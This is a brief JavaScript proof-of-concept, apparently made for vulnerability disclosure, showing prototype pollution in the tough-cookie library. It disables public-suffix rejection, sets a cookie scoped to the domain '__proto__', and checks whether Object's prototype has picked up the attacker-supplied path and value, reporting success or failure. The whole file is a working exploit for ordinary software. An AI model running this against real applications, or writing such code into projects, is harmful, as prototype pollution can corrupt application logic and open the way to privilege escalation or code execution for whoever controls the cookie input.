const tough = require("tough-cookie");

// This initializes a CookieJar storing the data in the local storage.
// It stores it in an object with the Object prototype.
// The `rejectPublicSuffixes` option is set to `false` to allow setting cookies on public suffixes.
const cookiejar = new tough.CookieJar(undefined, {
	rejectPublicSuffixes: false,
});

const path = "/exploit";
// This sets a cookie with the name `Slonser` and the value `polluted` on the domain `__proto__`
// What happens behind the scenes is that it stores it in store[domain][path][name] = value;
// If provided with domain `__proto__`, it will store it in store[Object][path][name] = value;
// This is because `__proto__` is a public suffix.
// This will cause the `Object` prototype to be polluted with the value `polluted`, which is injected by the attacker
cookiejar.setCookieSync(
	`Slonser=polluted; Domain=__proto__; Path=${path}`,
	"https://__proto__/admin"
);

// This check if the Object.prototype has been polluted with the new path and value provided by the attacker
const outputNessage = Object[path]?.["Slonser"]
	? "EXPLOITED SUCCESSFULLY"
	: "EXPLOIT FAILED";

console.log(outputNessage);
